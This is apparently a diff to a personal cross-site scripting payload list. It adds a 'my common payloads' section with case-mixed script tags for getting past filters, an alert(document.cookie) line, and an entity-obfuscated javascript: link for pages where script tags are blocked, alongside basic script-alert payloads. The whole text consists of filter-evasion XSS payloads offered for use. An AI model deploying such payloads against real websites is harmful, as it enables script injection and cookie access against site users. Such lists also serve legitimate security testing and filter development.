@@ -1,5 +1,21 @@
 More : http://htmlpurifier.org/live/smoketests/xssAttacks.php
 
+
+MY COMMON PAYLOADS
+=================================
+
+BYPASS NORMAL FILTER
+=========================
+<ScRipT>alert("XSS BY ASHIK");</ScRipT>
+<ScRipT>alert(document.cookie);</ScRipT>
+
+WHERE SCRIPT TAG NOT WORKING
+====================================
+<a href="jAvAsCrIpT&colon;alert&lpar;'Ashik'&rpar;">X</a>
+
+
+
+
 <script>alert(123);</script>
 <script>alert(document.cookie);</script>
 <script>alert("XSS");</script>
